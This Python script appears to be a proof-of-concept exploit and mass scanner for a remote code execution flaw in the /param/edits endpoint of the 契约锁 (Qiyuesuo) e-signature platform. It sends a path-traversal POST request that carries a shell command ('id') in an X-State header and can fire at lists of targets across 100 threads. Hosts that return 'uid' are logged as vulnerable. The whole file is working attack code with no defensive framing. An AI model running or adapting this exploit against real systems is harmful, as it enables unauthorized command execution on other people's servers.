# 契约锁电子签章平台 /param/edits 远程代码执行漏洞
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""                                                                                      _..._                        
                    _______                                                        .-'_..._''.                     
       __.....__    \  ___ `'.   .--.                                            .' .'      '.\     __.....__      
   .-''         '.   ' |--.\  \  |__|                                           / .'            .-''         '.    
  /     .-''"'-.  `. | |    \  ' .--.     .|                           .-,.--. . '             /     .-''"'-.  `.  
 /     /________\   \| |     |  '|  |   .' |_            ,.----------. |  .-. || |            /     /________\   \ 
 |                  || |     |  ||  | .'     |       _  //            \| |  | || |            |                  | 
 \    .-------------'| |     ' .'|  |'--.  .-'     .' | \\            /| |  | |. '            \    .-------------' 
  \    '-.____...---.| |___.' /' |  |   |  |      .   | /`'----------' | |  '-  \ '.          .\    '-.____...---. 
   `.             .'/_______.'/  |__|   |  |    .'.'| |//              | |       '. `._____.-'/ `.             .'  
     `''-...... -'  \_______|/          |  '.'.'.'.-'  /               | |         `-.______ /    `''-...... -'    
                                        |   / .'   \_.'                |_|                  `                      
                                        `'-'                                                                       

"""

    print(test)

def main():
    banner()
    parser=argparse.ArgumentParser(description='契约锁电子签章平台 /param/edits 远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload= '/contract/ukeysign/.%2e/.%2e/template/param/edits'
    headers={
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Content-Type':'application/json',
        'X-State':'id',
    }

    try:
        res1=requests.post(url=target+url_payload,headers=headers,timeout=10)
        if res1.status_code==200 and 'uid' in res1.text:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')

if __name__ =='__main__':
    main()
